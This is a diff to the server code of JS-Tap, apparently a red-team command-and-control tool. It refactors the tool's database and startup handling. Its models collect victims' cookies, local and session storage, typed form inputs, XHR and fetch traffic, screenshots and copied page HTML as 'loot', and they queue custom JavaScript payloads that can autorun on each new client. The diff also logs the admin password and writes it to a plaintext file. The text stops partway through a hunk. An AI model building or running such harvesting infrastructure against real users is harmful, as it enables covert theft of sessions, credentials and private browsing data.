@@ -5,11 +5,13 @@ from werkzeug.middleware.proxy_fix import ProxyFix
 from flask_cors import CORS
 from markupsafe import Markup, escape
 from flask_sqlalchemy import SQLAlchemy
-from sqlalchemy import DateTime, func, event
+from sqlalchemy import DateTime, func, event, create_engine, orm, Column, Integer, String, DateTime, Text, Boolean, update
 from sqlalchemy_utils import database_exists
 from sqlalchemy.engine import Engine
+from sqlalchemy.orm import scoped_session, sessionmaker, declarative_base
 from flask_login import LoginManager, login_user, logout_user, UserMixin, login_required, current_user
 from flask_bcrypt import Bcrypt
+from filelock import FileLock, Timeout
 from enum import Enum
 from user_agents import parse
 import magic
@@ -21,60 +23,11 @@ import threading
 import string
 import random
 import shutil
+import logging
 
 
 
-#***************************************************************************
-# Configuration
 
-# Proxy mode
-# Handy for running nginx proxy in front
-# of JS-Tap server to handle SSL certs.
-# If set to True
-# JS-Tap will run http and rely on nginx
-# Note that nginx needs to set an X-Forwarded-For 
-# header or JS-Tap won't know the IP address of the cliet
-# -----
-# If set to False JS-Tap will use a 
-# self signed cert
-proxyMode = False
-
-
-# Data Directory
-# File path to folder where loot directory 
-# and SQLite database are saved
-dataDirectory = "./"
-
-
-
-#***************************************************************************
-# Initialization stuff
-app = Flask(__name__)
-CORS(app)
-baseDir = os.path.abspath(os.path.dirname(__file__))
-app.config["SQLALCHEMY_DATABASE_URI"] = 'sqlite:///' + os.path.abspath(dataDirectory + 'jsTap.db')
-app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
-
-# app.config['SECRET_KEY'] = 'b4CtXzlMp9tsATa3i7jgNiB10eiJbrQG'
-app.config['SECRET_KEY'] = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=45))
-
-app.config['SESSION_COOKIE_SECURE']   = True
-app.config['SESSION_COOKIE_HTTPONLY'] = True
-app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
-
-db = SQLAlchemy(app)
-login_manager = LoginManager()
-login_manager.login_view = 'login'
-login_manager.init_app(app)
-bcrypt = Bcrypt(app)
-
-
-# Set our journaling mode to wright ahead log
-@event.listens_for(Engine, "connect")
-def set_sqlite_pragma(dbapi_connection, connection_record):
-    cursor = dbapi_connection.cursor()
-    cursor.execute("PRAGMA journal_mode=WAL;")
-    cursor.close()
 
 
 # *********************************************************************
@@ -114,21 +67,99 @@ def printHeader():
         """)
 
 
+#***************************************************************************
+# Configuration
+
+# Proxy mode
+# Handy for running nginx proxy in front
+# of JS-Tap server to handle SSL certs.
+# If set to True
+# JS-Tap will run http and rely on nginx
+# Note that nginx needs to set an X-Forwarded-For 
+# header or JS-Tap won't know the IP address of the cliet
+# -----
+# If set to False JS-Tap will use a 
+# self signed cert
+proxyMode    = False
+
+# overwrite based on value in gunicorn startup script
+envProxyMode = os.environ.get('PROXYMODE')
+if envProxyMode:
+    proxyMode = True
+elif not envProxyMode:
+    proxyMode = False 
+
+
+# Data Directory
+# File path to folder where loot directory 
+# and SQLite database are saved
+# Data Directory should have the trailing '/' added
+dataDirectory = "./"
+
+# overwrite based on value in gunicorn startup script
+envDataDir    = os.environ.get('DATADIRECTORY')
+
+if envDataDir is not None:
+    dataDirectory = envDataDir
+
+
+
+
 
 #***************************************************************************
-# Support Data
-SessionDirectories = {}
-SessionImages = {}
-SessionHTML = {}
-lootDirCounter = 1
-threadLock = ""
-databaseLock = ""
-
-
-# logFileName = "sessionLog.txt"
+# Initialization stuff
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+fh = logging.FileHandler('./logs.txt')
+fh.setLevel(logging.INFO)
+formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+fh.setFormatter(formatter)
+logger.addHandler(fh)
 
 
 
+app = Flask(__name__)
+CORS(app)
+baseDir = os.path.abspath(os.path.dirname(__file__))
+
+
+# This variable will be set if started from gunicorn script
+secretKey = os.environ.get('SESSIONKEY')
+
+if secretKey is not None:
+    app.config['SECRET_KEY'] = secretKey
+else:
+    app.config['SECRET_KEY'] = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=45))
+
+login_manager = LoginManager()
+login_manager.login_view = 'login'
+login_manager.init_app(app)
+bcrypt = Bcrypt(app)
+
+
+app.config['SESSION_COOKIE_SECURE']   = True
+app.config['SESSION_COOKIE_HTTPONLY'] = True
+app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
+
+
+
+# Scoped Session Database setup
+database_uri = 'sqlite:///' + os.path.abspath(dataDirectory + 'jsTap.db')
+engine       = create_engine(database_uri, connect_args={"check_same_thread": False})
+db_session   = scoped_session(sessionmaker(autocommit=False, autoflush=False, bind=engine))
+Base         = declarative_base()
+Base.query   = db_session.query_property()
+
+
+
+@app.teardown_request
+def remove_scoped_session(exception=None):
+    db_session.remove()
+
+
+
+
+#***************************************************************************
 # Needed to generate human readable nicknames
 AdjectiveList = {
         "funky",
@@ -221,24 +252,28 @@ MurderCritter = {
 
 #***************************************************************************
 # Database classes
-class Client(db.Model):
-    id           = db.Column(db.Integer, primary_key=True)
-    nickname     = db.Column(db.String(100), unique=True, nullable=False)
-    tag          = db.Column(db.String(40), unique=False, nullable=True)
-    uuid         = db.Column(db.String(40), unique=True, nullable=False)
-    sessionValid = db.Column(db.Boolean, nullable=False, default=True)
-    notes        = db.Column(db.Text, nullable=True)
-    firstSeen    = db.Column(db.DateTime(timezone=True),server_default=func.now())
-    lastSeen     = db.Column(db.DateTime(timezone=True), server_default=func.now())
-    ipAddress    = db.Column(db.String(20), nullable=True)
-    platform     = db.Column(db.String(100), nullable=True)
-    browser      = db.Column(db.String(100), nullable=True)
-    isStarred    = db.Column(db.Boolean, nullable=False, default=False)
-    hasJobs      = db.Column(db.Boolean, nullable=False, default=False)
+class Client(Base):
+    __tablename__ = 'clients'
+
+    id              = Column(Integer, primary_key=True)
+    nickname        = Column(String(100), unique=True, nullable=False)
+    tag             = Column(String(40), unique=False, nullable=True)
+    uuid            = Column(String(40), unique=True, nullable=False)
+    sessionValid    = Column(Boolean, nullable=False, default=True)
+    notes           = Column(Text, nullable=True)
+    firstSeen       = Column(DateTime(timezone=True),server_default=func.now())
+    lastSeen        = Column(DateTime(timezone=True), server_default=func.now())
+    ipAddress       = Column(String(20), nullable=True)
+    platform        = Column(String(100), nullable=True)
+    browser         = Column(String(100), nullable=True)
+    isStarred       = Column(Boolean, nullable=False, default=False)
+    hasJobs         = Column(Boolean, nullable=False, default=False)
+    imageCounter    = Column(Integer, server_default='1')
+    htmlCodeCounter = Column(Integer, server_default='1')
 
 
     def update(self):
-        # print("$$ Client Update func")
+        # logger.info("$$ Client Update func")
         self.lastSeen = func.now()
 
     def __repr__(self):
@@ -246,197 +281,233 @@ class Client(db.Model):
 
 
 # Keep screenshots as files on disk, just track the filename
-class Screenshot(db.Model):
-    id        = db.Column(db.Integer, primary_key=True)
-    clientID  = db.Column(db.String(100), nullable=False)
-    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
-    fileName  = db.Column(db.String(100), nullable=False)
+class Screenshot(Base):
+    __tablename__ = 'screenshots'
+
+    id        = Column(Integer, primary_key=True)
+    clientID  = Column(String(100), nullable=False)
+    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
+    fileName  = Column(String(100), nullable=False)
   
     def __repr__(self):
         return f'<Screenshot {self.id}>'
 
 
-class HtmlCode(db.Model):
-    id        = db.Column(db.Integer, primary_key=True)
-    clientID  = db.Column(db.String(100), nullable=False)
-    url       = db.Column(db.String(100), nullable=False)
-    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
-    fileName  = db.Column(db.String(100), nullable=False)
+class HtmlCode(Base):
+    __tablename__ = 'htmlcode'
+
+    id        = Column(Integer, primary_key=True)
+    clientID  = Column(String(100), nullable=False)
+    url       = Column(String(100), nullable=False)
+    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
+    fileName  = Column(String(100), nullable=False)
 
 
     def __repr__(self):
         return f'<HtmlCode {self.id}>'
 
 
-class UrlVisited(db.Model):
-    id        = db.Column(db.Integer, primary_key=True)
-    clientID  = db.Column(db.String(100), nullable=False)
-    url       = db.Column(db.String(100), nullable=False)
-    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
+class UrlVisited(Base):
+    __tablename__ = 'urlsvisited'
+
+    id        = Column(Integer, primary_key=True)
+    clientID  = Column(String(100), nullable=False)
+    url       = Column(String(100), nullable=False)
+    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
         return f'<UrlVisited {self.id}>'
 
 
-class UserInput(db.Model):
-    id         = db.Column(db.Integer, primary_key=True)
-    clientID   = db.Column(db.String(100), nullable=False)
-    inputName  = db.Column(db.String(100), nullable=False)
-    inputValue = db.Column(db.Text, nullable=False)
-    timeStamp  = db.Column(db.DateTime(timezone=True), server_default=func.now())
+class UserInput(Base):
+    __tablename__ = 'userinput'
+
+    id         = Column(Integer, primary_key=True)
+    clientID   = Column(String(100), nullable=False)
+    inputName  = Column(String(100), nullable=False)
+    inputValue = Column(Text, nullable=False)
+    timeStamp  = Column(DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
         return f'<UserInput {self.id}>'
 
 
-class Cookie(db.Model):
-    id          = db.Column(db.Integer, primary_key=True)
-    clientID    = db.Column(db.String(100), nullable=False)
-    cookieName  = db.Column(db.String(100), nullable=False)
-    cookieValue = db.Column(db.String(100), nullable=False)
-    timeStamp   = db.Column(db.DateTime(timezone=True), server_default=func.now())
+class Cookie(Base):
+    __tablename__ = 'cookies'
+
+    id          = Column(Integer, primary_key=True)
+    clientID    = Column(String(100), nullable=False)
+    cookieName  = Column(String(100), nullable=False)
+    cookieValue = Column(String(100), nullable=False)
+    timeStamp   = Column(DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
         return f'<Cookie {self.id}>'
 
 
-class LocalStorage(db.Model):
-    id        = db.Column(db.Integer, primary_key=True)
-    clientID  = db.Column(db.String(100), nullable=False)
-    key       = db.Column(db.String(100), nullable=False)
-    value     = db.Column(db.String(100), nullable=False)
-    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
+class LocalStorage(Base):
+    __tablename__ = 'localstorage'
+
+    id        = Column(Integer, primary_key=True)
+    clientID  = Column(String(100), nullable=False)
+    key       = Column(String(100), nullable=False)
+    value     = Column(String(100), nullable=False)
+    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
         return f'<LocalStorage {self.id}>'
 
 
-class SessionStorage(db.Model):
-    id        = db.Column(db.Integer, primary_key=True)
-    clientID  = db.Column(db.String(100), nullable=False)
-    key       = db.Column(db.String(100), nullable=False)
-    value     = db.Column(db.String(100), nullable=False)
-    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
+class SessionStorage(Base):
+    __tablename__ = 'sessionstorage'
+
+    id        = Column(Integer, primary_key=True)
+    clientID  = Column(String(100), nullable=False)
+    key       = Column(String(100), nullable=False)
+    value     = Column(String(100), nullable=False)
+    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
         return f'<SessionStorage {self.id}>'
 
 
-class XhrOpen(db.Model):
-    id        = db.Column(db.Integer, primary_key=True)
-    clientID  = db.Column(db.String(100), nullable=False)
-    method    = db.Column(db.String(100), nullable=False)
-    url       = db.Column(db.String(300), nullable=False)
-    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
+class XhrOpen(Base):
+    __tablename__ = 'xhropen'
+
+    id        = Column(Integer, primary_key=True)
+    clientID  = Column(String(100), nullable=False)
+    method    = Column(String(100), nullable=False)
+    url       = Column(String(300), nullable=False)
+    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
         return f'<XhrOpen {self.id}>'
 
 
-class XhrSetHeader(db.Model):
-    id        = db.Column(db.Integer, primary_key=True)
-    clientID  = db.Column(db.String(100), nullable=False)
-    header    = db.Column(db.String(100), nullable=False)
-    value     = db.Column(db.String(300), nullable=False)
-    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
+class XhrSetHeader(Base):
+    __tablename__ = 'xhrheader'
+
+    id        = Column(Integer, primary_key=True)
+    clientID  = Column(String(100), nullable=False)
+    header    = Column(String(100), nullable=False)
+    value     = Column(String(300), nullable=False)
+    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
         return f'<XhrSetHeader {self.id}>'
 
 
-class XhrCall(db.Model):
-    id           = db.Column(db.Integer, primary_key=True)
-    clientID     = db.Column(db.String(100), nullable=False)
-    requestBody  = db.Column(db.Text, nullable=True);
-    responseBody = db.Column(db.Text, nullable=True);
-    timeStamp    = db.Column(db.DateTime(timezone=True), server_default=func.now())
+class XhrCall(Base):
+    __tablename__ = 'xhrcall'
+
+    id           = Column(Integer, primary_key=True)
+    clientID     = Column(String(100), nullable=False)
+    requestBody  = Column(Text, nullable=True);
+    responseBody = Column(Text, nullable=True);
+    timeStamp    = Column(DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
         return f'<XhrCall {self.id}>'
 
 
-class FetchSetup(db.Model):
-    id        = db.Column(db.Integer, primary_key=True)
-    clientID  = db.Column(db.String(100), nullable=False)
-    method    = db.Column(db.String(100), nullable=False)
-    url       = db.Column(db.String(300), nullable=False)
-    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
+class FetchSetup(Base):
+    __tablename__ = 'fetchsetup'
+
+    id        = Column(Integer, primary_key=True)
+    clientID  = Column(String(100), nullable=False)
+    method    = Column(String(100), nullable=False)
+    url       = Column(String(300), nullable=False)
+    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
         return f'<FetchSetup {self.id}>'
 
 
-class FetchHeader(db.Model):
-    id        = db.Column(db.Integer, primary_key=True)
-    clientID  = db.Column(db.String(100), nullable=False)
-    header    = db.Column(db.String(100), nullable=False)
-    value     = db.Column(db.String(300), nullable=False)
-    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
+class FetchHeader(Base):
+    __tablename__ = 'fetchheader'
+
+    id        = Column(Integer, primary_key=True)
+    clientID  = Column(String(100), nullable=False)
+    header    = Column(String(100), nullable=False)
+    value     = Column(String(300), nullable=False)
+    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
         return f'<FetchHeader {self.id}>'
 
 
-class FetchCall(db.Model):
-    id           = db.Column(db.Integer, primary_key=True)
-    clientID     = db.Column(db.String(100), nullable=False)
-    requestBody  = db.Column(db.Text, nullable=True);
-    responseBody = db.Column(db.Text, nullable=True);
-    timeStamp    = db.Column(db.DateTime(timezone=True), server_default=func.now())
+class FetchCall(Base):
+    __tablename__ = 'fetchcall'
+
+    id           = Column(Integer, primary_key=True)
+    clientID     = Column(String(100), nullable=False)
+    requestBody  = Column(Text, nullable=True);
+    responseBody = Column(Text, nullable=True);
+    timeStamp    = Column(DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
         return f'<FetchCall {self.id}>'
 
 
-class Event(db.Model):
-    id        = db.Column(db.Integer, primary_key=True)
-    clientID  = db.Column(db.String(100), nullable=False)
-    timeStamp = db.Column(db.DateTime(timezone=True))
-    eventType = db.Column(db.String(100), nullable=False)
-    eventID   = db.Column(db.Integer, nullable=False)
+class Event(Base):
+    __tablename__ = 'events'
+
+    id        = Column(Integer, primary_key=True)
+    clientID  = Column(String(100), nullable=False)
+    timeStamp = Column(DateTime(timezone=True))
+    eventType = Column(String(100), nullable=False)
+    eventID   = Column(Integer, nullable=False)
 
     def __repr__(self):
         return f'<Event {self.id}>'
 
 
 # Application settings
-class AppSettings(db.Model):
-    id                = db.Column(db.Integer, primary_key=True)
-    allowNewSesssions = db.Column(db.Boolean, default=True)
+class AppSettings(Base):
+    __tablename__ = 'appsettings'
+
+    id                = Column(Integer, primary_key=True)
+    allowNewSesssions = Column(Boolean, default=True)
 
     def __repr__(self):
         return f'<AppSettings {self.id}>'
 
 
 
-class CustomPayload(db.Model):
-    id          = db.Column(db.Integer, primary_key=True)
-    name        = db.Column(db.String(100), nullable=False)
-    description = db.Column(db.Text, nullable=True)
-    code        = db.Column(db.Text, nullable=False)
-    autorun     = db.Column(db.Boolean, nullable=False, default=False)
-    repeatrun   = db.Column(db.Boolean, nullable=False, default=False)
+class CustomPayload(Base):
+    __tablename__ = 'custompayloads'
+
+    id          = Column(Integer, primary_key=True)
+    name        = Column(String(100), nullable=False)
+    description = Column(Text, nullable=True)
+    code        = Column(Text, nullable=False)
+    autorun     = Column(Boolean, nullable=False, default=False)
+    repeatrun   = Column(Boolean, nullable=False, default=False)
 
     def __repr__(self):
         return f'<CustomPayload {self.id}>'
 
 
 
-class ClientPayloadJob(db.Model):   
-    id          = db.Column(db.Integer, primary_key=True)
-    clientKey   = db.Column(db.Integer, nullable=False)
-    payloadKey  = db.Column(db.Integer, nullable=False)
-    code        = db.Column(db.Text, nullable=False)
-    repeatrun   = db.Column(db.Boolean, nullable=False, default=False)
+class ClientPayloadJob(Base):   
+    __tablename__ = 'clientpayloadjobs'
+
+    id          = Column(Integer, primary_key=True)
+    clientKey   = Column(Integer, nullable=False)
+    payloadKey  = Column(Integer, nullable=False)
+    code        = Column(Text, nullable=False)
+    repeatrun   = Column(Boolean, nullable=False, default=False)
 
     def __repr__(self):
         return f'<ClientPayloadJob {self.id}>'
 
 
 
-class BlockedIP(db.Model):
-    id  = db.Column(db.Integer, primary_key=True)
-    ip  = db.Column(db.String(20), nullable=False)
+class BlockedIP(Base):
+    __tablename__ = 'blockedips'
+
+    id  = Column(Integer, primary_key=True)
+    ip  = Column(String(20), nullable=False)
   
     def __repr__(self):
         return f'<BlockedIP {self.id}>'
@@ -444,11 +515,12 @@ class BlockedIP(db.Model):
 
 
 # User C2 UI session
-class User(UserMixin, db.Model):
-    __table_name__ = 'user'
-    username       = db.Column(db.String, primary_key=True)
-    password       = db.Column(db.String, nullable=False)
-    authenticated  = db.Column(db.Boolean, default=False)
+class User(UserMixin, Base):
+    __tablename__ = 'user'
+
+    username       = Column(String, primary_key=True)
+    password       = Column(String, nullable=False)
+    authenticated  = Column(Boolean, default=False)
 
     def is_active(self):
         # We don't need to deactivate user accounts, but
@@ -475,16 +547,17 @@ class User(UserMixin, db.Model):
 
 # Need function to check session, return download directory
 def findLootDirectory(identifier):
-    lootDir = "client_" + str(SessionDirectories[identifier])
-    #print("Loot directory is: " + lootDir)
+    client = Client.query.with_entities(Client.id).filter_by(uuid=identifier).first()
+
+    lootDir = "client_" + str(client.id)
+    #logger.info("Loot directory is: " + lootDir)
     return lootDir
 
 
 
 def dbCommit():
-    databaseLock.acquire()
-    db.session.commit()
-    databaseLock.release()
+    # Well, there used to be more stuff here...
+    db_session.commit()
 
 
 
@@ -508,8 +581,8 @@ def scheduleRepeatTasks(client):
         
         if not alreadyScheduled:
             newJob = ClientPayloadJob(clientKey=client.id, payloadKey = payload.id, code=payload.code, repeatrun=True)
-            db.session.add(newJob)
-            # print('********* Just added client update repeat job: ' + client.nickname + ', ' + str(payload.id))
+            db_session.add(newJob)
+            # logger.info('********* Just added client update repeat job: ' + client.nickname + ', ' + str(payload.id))
             dbCommit()
 
 
@@ -519,12 +592,12 @@ def scheduleRepeatTasks(client):
 # Updates "last seen" timestamp"
 # Do not call db commit in here
 def clientSeen(identifier, ip, userAgent):
-    # print("!! Client seen: " + str(ip) + ', ' + userAgent)
-    # print("*** Starting clientSeen Update!")
+    # logger.info("!! Client seen: " + str(ip) + ', ' + userAgent)
+    # logger.info("*** Starting clientSeen Update!")
 
     parsedUserAgent = parse(userAgent)
-    # print("--Browser: " + parsedUserAgent.browser.family + " " + parsedUserAgent.browser.version_string)
-    # print("--Platform: " + parsedUserAgent.os.family)
+    # logger.info("--Browser: " + parsedUserAgent.browser.family + " " + parsedUserAgent.browser.version_string)
+    # logger.info("--Platform: " + parsedUserAgent.os.family)
 
 
     # DB commit is handled by caller to clientSeen() method, don't do it here
@@ -568,21 +641,32 @@ def user_loader(username):
 
 # Need an admin account
 def addAdminUser():
-    passwordLength = 45
+    currentAdmin = User.query.filter_by(username='admin').first()
 
-    randomPassword = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase 
-        + string.digits, k=passwordLength))
+    # We won the multithread race, create the admin user
+    if currentAdmin is None:
+        passwordLength = 45
+
+        randomPassword = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase 
+            + string.digits, k=passwordLength))
 
 
-    print("*******************************")
-    print("WebApp admin creds:")
-    print("admin : " + randomPassword)
-    print("*******************************")
+        logger.info("*******************************")
+        logger.info("WebApp admin creds:")
+        logger.info("admin : " + randomPassword)
+        logger.info("*******************************")
 
-    adminUser = User(username='admin', password=bcrypt.generate_password_hash(randomPassword))
+        adminUser = User(username='admin', password=bcrypt.generate_password_hash(randomPassword))
 
-    db.session.add(adminUser)
-    dbCommit()
+        db_session.add(adminUser)
+        dbCommit()
+
+        with open('./adminCreds.txt', 'w') as credFile:
+            credFile.write('admin:' + randomPassword + '\n')
+            credFile.close()
+    else:
+        # already have an admin!
+        logger.info("Skipping admin add, already have one!")
 
 
 
@@ -591,7 +675,7 @@ def addAdminUser():
 def initApplicationDefaults():
     appSettings = AppSettings(allowNewSesssions=True)
 
-    db.session.add(appSettings)
+    db_session.add(appSettings)
     dbCommit()
 
 
@@ -610,15 +694,150 @@ def generateNickname():
     counter = 0
     while Client.query.filter_by(nickname=newNickname).count():
         baseNickname = newNickname.replace('-'+ str(counter), '')
-        # print("Base nickname created: " + baseNickname)
+        # logger.info("Base nickname created: " + baseNickname)
         counter += 1
 
 
         newNickname = baseNickname + '-' + str(counter)
-        # print("Still looping for name, counter: " + str(counter))
-        # print("Current newNickname: " + newNickname)
+        # logger.info("Still looping for name, counter: " + str(counter))
+        # logger.info("Current newNickname: " + newNickname)
 
     return newNickname
+
+
+
+
+
+
+#***************************************************************************
+# Database startup
+
+# Moved from main:
+# Check for existing database file
+# Make sure only one process runs this
+startupLock  = FileLock("./init.lock")
+lockAcquired = False
+
+try:
+    startupLock.acquire(timeout=2)
+    lockAcquired = True
+    printHeader()
+    if database_exists('sqlite:///' + os.path.abspath(dataDirectory + 'jsTap.db')):
+        with app.app_context():
+            logger.info("!! SQLite database already exists:")
+            clients = Client.query.all()
+            numClients = len(clients)
+
+            users = User.query.all()
+            numUsers = len(users)
+
+            logger.info("Existing database has " + str(numClients) + " clients and " 
+                + str(numUsers) + " users.")
+
+            # Generate a new admin user
+            logger.info("Creating tables!")
+            User.__table__.drop(engine)
+            Base.metadata.create_all(engine)
+            dbCommit()
+            addAdminUser()
+
+            # If we're being run from the gunicorn start script this will be set by that
+            clientSaveSetting = os.environ.get('CLIENTDATA')
+
+
+            if numClients != 0:
+                val = ""
+
+                # See if we're started from gunicorn startup script
+                if clientSaveSetting is not None:
+                    if clientSaveSetting == 'KEEP':
+                        val = 1
+                    elif clientSaveSetting == 'DELETE':
+                        val = 2
+                else:
+                    # apparently running developer mode directly
+                    print("Make selection on how to handle existing clients:")
+                    print("1 - Keep existing client data")
+                    print("2 - Delete all client data and start fresh")
+
+                    val = int(input("\nSelection: "))
+
+
+                if val == 2:
+                    logger.info("Clearing client data")
+                    Client.__table__.drop(engine)
+                    Screenshot.__table__.drop(engine)
+                    HtmlCode.__table__.drop(engine)
+                    UrlVisited.__table__.drop(engine)
+                    UserInput.__table__.drop(engine)
+                    Cookie.__table__.drop(engine)
+                    LocalStorage.__table__.drop(engine)
+                    SessionStorage.__table__.drop(engine)
+                    XhrOpen.__table__.drop(engine)
+                    XhrSetHeader.__table__.drop(engine)
+                    XhrCall.__table__.drop(engine)
+                    FetchSetup.__table__.drop(engine)
+                    FetchHeader.__table__.drop(engine)
+                    FetchCall.__table__.drop(engine)
+                    Event.__table__.drop(engine)
+                    ClientPayloadJob.__table__.drop(engine)
+                    dbCommit()
+
+                    Base.metadata.create_all(engine)
+
+                    if os.path.exists(dataDirectory + "lootFiles"):
+                        shutil.rmtree(dataDirectory + "lootFiles")
+
+                elif val == 1:
+                    logger.info("Keeping existing client data.")
+                else:
+                    print("Invalid selection.")
+                    exit()
+
+
+    else:
+        logger.info("No database found")
+        logger.info("... creating database...")
+        with app.app_context():
+            Base.metadata.drop_all(engine)
+            Base.metadata.create_all(engine)
+
+            if os.path.exists(dataDirectory + "lootFiles"):
+                shutil.rmtree(dataDirectory + "lootFiles")
+            dbCommit()
+            addAdminUser()
+            initApplicationDefaults()
+
+
+
+    # Check for loot directory
+    if not os.path.exists(dataDirectory + "lootFiles"):
+        os.mkdir(dataDirectory + "lootFiles")
+
+
+    # Set our journaling mode to wright ahead log
+    @event.listens_for(Engine, "connect")
+    def set_sqlite_pragma(dbapi_connection, connection_record):
+        cursor = dbapi_connection.cursor()
+        cursor.execute("PRAGMA journal_mode=WAL;")
+        cursor.execute("PRAGMA synchronous=normal;")
+        cursor.execute("PRAGMA cache_size = -20971520;") # 20MB
+        cursor.close()
+
+    # Need the other threads to move on beyond the init code
+    time.sleep(5)
+
+
+except Timeout:
+    logger.info("Server process skipping redundant startup initialization")
+
+finally:
+    if lockAcquired:
+        logger.info("Releasing startup filelock")
+        startupLock.release()
+        logger.info("************************************")
+        logger.info("JS-Tap Server Online - Happy Hunting")
+        logger.info("************************************")
 
 
 
@@ -679,11 +898,11 @@ def sendLootFile(path):
     # Rendering the HTML copy in the browswer will likely hit the target server
     # with CSS/JavaScript requests from our browser. No good. 
     if "htmlCopy.html" in path:
-        # print("### We're serving up stolent HTML!")
+        # logger.info("### We're serving up stolent HTML!")
         return send_from_directory(dataDirectory + 'lootFiles', path, as_attachment=True)
     else:
         # Just display the screenshot in the browser, this is safe
-        # print("#### Serving up screenshot!")    
+        # logger.info("#### Serving up screenshot!")    
         return send_from_directory(dataDirectory + 'lootFiles', path)
 
 
@@ -700,10 +919,10 @@ def sendProtectedStaticFile(path):
 
 @app.route('/login', methods=['POST', 'GET'])
 def login():
-    print("Top of login...")
+    logger.info("Top of login...")
 
     if request.method == 'GET':
-        print("** Handling login GET...")
+        logger.info("** Handling login GET...")
         with open('./login.html', 'r') as file:
             loginForm = file.read()
             response = make_response(loginForm, 200)
@@ -713,7 +932,7 @@ def login():
 
 
     if request.method == 'POST':
-        print("** Handling login POST...")
+        logger.info("** Handling login POST...")
         username = request.form['username']
         password = request.form['password']
 
@@ -723,21 +942,21 @@ def login():
             isValidPassword = bcrypt.check_password_hash(user.password, password) 
 
             if isValidPassword:
-                print("Password matched!")
+                logger.info("Password matched!")
                 login_user(user)
                 return redirect(url_for('sendIndex'))
                 # response = make_response("Successful login.", 200)
                 # return response
             else:
-                print("Auth: Password didn't match")
+                logger.info("Auth: Password didn't match")
                 response = make_response("No.", 401)
                 return response
-                print("Password didn't match :(")
+                logger.info("Password didn't match :(")
         else:
             # Make sure equal processing time, avoiding time based user enum
             hash = bcrypt.generate_password_hash(password)
 
-            print("Auth: User not found")
+            logger.info("Auth: User not found")
             response = make_response("No.", 401)
             return response
 
@@ -759,7 +978,7 @@ def returnUUID(tag=''):
     # Check to see if we're still allowing new client connections
     appSettings = AppSettings.query.filter_by(id=1).first()
 
-    print("In UUID, app setting is: " + str(appSettings.allowNewSesssions))
+    # logger.info("In UUID, app setting is: " + str(appSettings.allowNewSesssions))
     if (appSettings.allowNewSesssions == False):
         return "No.", 401
 
@@ -777,38 +996,27 @@ def returnUUID(tag=''):
     # setup a new client
     token = str(uuid.uuid4())
 
-    # Setup new client
-    global lootDirCounter
-
-    threadLock.acquire()
-    print("New session for client: " + token)
+    logger.info("New session for client: " + token)
 
 
     # Database Entry
     newNickname = generateNickname()
     newClient   = Client(uuid=str(token), nickname=newNickname, tag=tag, notes="")
-    db.session.add(newClient)
-    db.session.commit()
+    db_session.add(newClient)
+    db_session.commit()
 
     # Initialize our storage
-    SessionDirectories[token] = lootDirCounter
-    lootDirCounter = lootDirCounter + 1
-    lootPath = dataDirectory + 'lootFiles/client_' + str(SessionDirectories[token])
+    lootPath = dataDirectory + 'lootFiles/client_' + str(newClient.id)
 
     if not os.path.exists(lootPath):
-        #print("Creating directory...")
+        #logger.info("Creating directory...")
         os.mkdir(lootPath)
 
         # Record the client index
         clientFile = open(dataDirectory + "lootFiles/clients.txt", "a")
         clientFile.write(str(time.time()) + ", " + token + ": " + lootPath + "\n")
         clientFile.close()
-
-    # Initialize our number trackers
-    SessionImages[token] = 1;
-    SessionHTML[token]   = 1;
-    
-    threadLock.release()
+    # threadLock.release()
 
     # Add any autorun payloads for this client
     payloads = CustomPayload.query.filter_by(autorun=True)
@@ -816,7 +1024,7 @@ def returnUUID(tag=''):
 
     for payload in payloads:
         newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code)
-        db.session.add(newJob)
+        db_session.add(newJob)
     dbCommit()
 
     uuidData = {'clientToken':token}
@@ -844,10 +1052,10 @@ def returnPayloads(identifier):
     taskedPayloads = [{'id':payload.id, 'data':payload.code} for payload in payloads]
 
     for payload in payloads:
-        # print("Payload found: " + str(payload.id))
+        # logger.info("Payload found: " + str(payload.id))
         # only delete if it's repeatrun is set to no
         if payload.repeatrun == False:
-            db.session.delete(payload)
+            db_session.delete(payload)
             dbChange = True
     
     # Useful for UI feedback
@@ -872,8 +1080,8 @@ def returnPayloads(identifier):
 # Capture screenshot
 @app.route('/loot/screenshot/<identifier>', methods=['POST'])
 def recordScreenshot(identifier):
-    # print("Received image from: " + identifier)
-    #print("Looking up loot dir...")
+    # logger.info("Received image from: " + identifier)
+    #logger.info("Looking up loot dir...")
 
     if not isClientSessionValid(identifier):
         return "No.", 401
@@ -887,26 +1095,24 @@ def recordScreenshot(identifier):
     # what we're expecting. Definitely don't want SVGs
     if file_type != 'image/png':
